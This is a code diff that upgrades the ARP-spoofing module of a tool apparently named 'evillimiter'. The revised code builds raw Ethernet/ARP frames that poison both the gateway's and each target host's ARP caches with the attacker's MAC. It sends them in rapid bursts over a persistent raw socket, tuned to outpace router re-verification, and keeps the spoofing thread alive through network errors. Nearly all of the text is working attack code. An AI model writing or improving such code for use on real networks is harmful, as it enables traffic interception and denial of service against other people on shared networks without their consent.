@@ -1,6 +1,6 @@
 import time
 import threading
-from scapy.all import ARP, send # pylint: disable=no-name-in-module
+from scapy.all import Ether, ARP, conf, get_if_hwaddr # pylint: disable=no-name-in-module
 
 from .host import Host
 from evillimiter.common.globals import BROADCAST
@@ -11,6 +11,9 @@ class ARPSpoofer(object):
         self.interface = interface
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
+
+        # resolve attacker's own MAC once at init (used in L2 frame construction)
+        self._attacker_mac = get_if_hwaddr(interface)
 
         # interval in seconds between spoofed ARP packet cycles
         # default 0.5s (aggressive) to outpace 5G router ARP re-verification
@@ -23,6 +26,7 @@ class ARPSpoofer(object):
         self._hosts = set()
         self._hosts_lock = threading.Lock()
         self._running = False
+        self._socket = None
 
     def add(self, host):
         with self._hosts_lock:
@@ -40,48 +44,149 @@ class ARPSpoofer(object):
         host.spoofed = False
 
     def start(self):
-        thread = threading.Thread(target=self._spoof, args=[], daemon=True)
-
         self._running = True
+
+        thread = threading.Thread(target=self._spoof, args=[], daemon=True)
         thread.start()
 
     def stop(self):
         self._running = False
 
-    def _spoof(self):
-        while self._running:
-            self._hosts_lock.acquire()
-            # make a deep copy to reduce lock time
-            hosts = self._hosts.copy()
-            self._hosts_lock.release()
+    def _open_socket(self):
+        """Open a persistent L2 raw socket for fast packet injection"""
+        try:
+            self._socket = conf.L2socket(iface=self.interface)
+        except OSError as e:
+            self._socket = None
+            raise
 
-            for host in hosts:
-                if not self._running:
-                    return
+    def _close_socket(self):
+        """Safely close the persistent socket"""
+        if self._socket is not None:
+            try:
+                self._socket.close()
+            except Exception:
+                pass
+            finally:
+                self._socket = None
 
-                self._send_spoofed_packets(host)
-            
-            time.sleep(self.interval)
+    def _build_l2_packets(self, host):
+        """
+        Pre-construct full Layer-2 Ethernet frames.
+        Zero runtime route lookup or MAC resolution overhead.
+        """
+        return [
+            # Poison gateway: "host.ip is at attacker's MAC"
+            Ether(src=self._attacker_mac, dst=self.gateway_mac) /
+            ARP(op=2,
+                hwsrc=self._attacker_mac, psrc=host.ip,
+                hwdst=self.gateway_mac, pdst=self.gateway_ip),
 
-    def _send_spoofed_packets(self, host):
-        # 2 packets = 1 gateway packet, 1 host packet
-        # each sent burst_count times to win the ARP race condition
-        packets = [
-            ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
-            ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac)
+            # Poison target: "gateway_ip is at attacker's MAC"
+            Ether(src=self._attacker_mac, dst=host.mac) /
+            ARP(op=2,
+                hwsrc=self._attacker_mac, psrc=self.gateway_ip,
+                hwdst=host.mac, pdst=host.ip)
         ]
 
-        [send(x, verbose=0, iface=self.interface, count=self.burst_count) for x in packets]
+    def _build_restore_packets(self, host):
+        """
+        Construct legitimate ARP packets that restore the real MAC mappings.
+        Sent to broadcast to ensure all devices update their ARP tables.
+        """
+        return [
+            # Tell gateway: "host.ip is at host's REAL MAC"
+            Ether(src=host.mac, dst=BROADCAST) /
+            ARP(op=2,
+                hwsrc=host.mac, psrc=host.ip,
+                hwdst=BROADCAST, pdst=self.gateway_ip),
+
+            # Tell target: "gateway_ip is at gateway's REAL MAC"
+            Ether(src=self.gateway_mac, dst=BROADCAST) /
+            ARP(op=2,
+                hwsrc=self.gateway_mac, psrc=self.gateway_ip,
+                hwdst=BROADCAST, pdst=host.ip)
+        ]
+
+    def _spoof(self):
+        """
+        Main spoofing loop with persistent socket and resilient error handling.
+        Thread will not die silently on network errors.
+        """
+        consecutive_errors = 0
+        max_consecutive_errors = 10
+
+        # open persistent L2 socket once — reused for all sends
+        try:
+            self._open_socket()
+        except OSError:
+            self._running = False
+            return
+
+        try:
+            while self._running:
+                try:
+                    self._hosts_lock.acquire()
+                    hosts = self._hosts.copy()
+                    self._hosts_lock.release()
+
+                    # build all packets for all hosts, then send in rapid burst
+                    all_packets = []
+                    for host in hosts:
+                        if not self._running:
+                            return
+                        all_packets.extend(self._build_l2_packets(host))
+
+                    # burst-send: each packet sent burst_count times via raw socket
+                    for pkt in all_packets:
+                        for _ in range(self.burst_count):
+                            self._socket.send(pkt)
+
+                    consecutive_errors = 0
+                    time.sleep(self.interval)
+
+                except OSError as e:
+                    # network buffer full, interface down, permission error
+                    consecutive_errors += 1
+
+                    if consecutive_errors >= max_consecutive_errors:
+                        self._running = False
+                        return
+
+                    # attempt to reopen socket in case interface was reset
+                    self._close_socket()
+                    time.sleep(1)
+                    try:
+                        self._open_socket()
+                    except OSError:
+                        pass
+
+                except Exception:
+                    consecutive_errors += 1
+                    if consecutive_errors >= max_consecutive_errors:
+                        self._running = False
+                        return
+                    time.sleep(0.5)
+        finally:
+            self._close_socket()
 
     def _restore(self, host):
         """
-        Remaps host and gateway to their actual addresses
+        Remaps host and gateway to their actual addresses.
+        Uses a temporary socket with retry logic for reliability.
         """
-        # 2 packets = 1 gateway packet, 1 host packet
-        # sent with higher count to ensure restoration sticks
-        packets = [
-            ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST),
-            ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST)
-        ]
+        packets = self._build_restore_packets(host)
+        restore_count = 5
 
-        [send(x, verbose=0, iface=self.interface, count=5) for x in packets]
+        for attempt in range(3):
+            try:
+                sock = conf.L2socket(iface=self.interface)
+                try:
+                    for pkt in packets:
+                        for _ in range(restore_count):
+                            sock.send(pkt)
+                    return  # success
+                finally:
+                    sock.close()
+            except OSError:
+                time.sleep(0.1)
